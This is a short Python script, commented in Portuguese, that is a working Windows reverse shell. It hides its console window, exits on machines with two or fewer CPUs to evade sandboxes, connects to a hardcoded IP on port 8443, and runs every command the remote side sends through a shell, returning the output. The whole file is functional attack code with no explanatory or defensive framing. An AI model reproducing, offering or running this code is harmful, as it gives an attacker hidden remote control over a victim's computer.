import os
import socket
import subprocess
import ctypes

# esconder terminal
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
SW_HIDE = 0
hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, SW_HIDE)

if os.cpu_count() <= 2:
    quit()

# variaveis de conexão reversa
ip = "192.168.1.13"
port = 8443

# iniciando conexao
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(str.encode("[*] Conexao Estabelecida!\n"))

# loop de comandos
while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        cmd = s.recv(1024).decode("utf-8")
        cmd = cmd.strip('\n')
        if cmd == "sair": 
            break
        if cmd[:2] == "cd":
            os.chdir(cmd[3:])
        if len(cmd) > 0:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            valor_saida = proc.stdout.read() + proc.stderr.read()
            try:
                saida_str = str(valor_saida, "utf-8")
                s.send(str.encode("\n" + saida_str))
            except Exception:
                saida_str = str(valor_saida, "latin_1")
                s.send(str.encode("\n" + saida_str))
    except Exception as e:
        continue
    
s.close()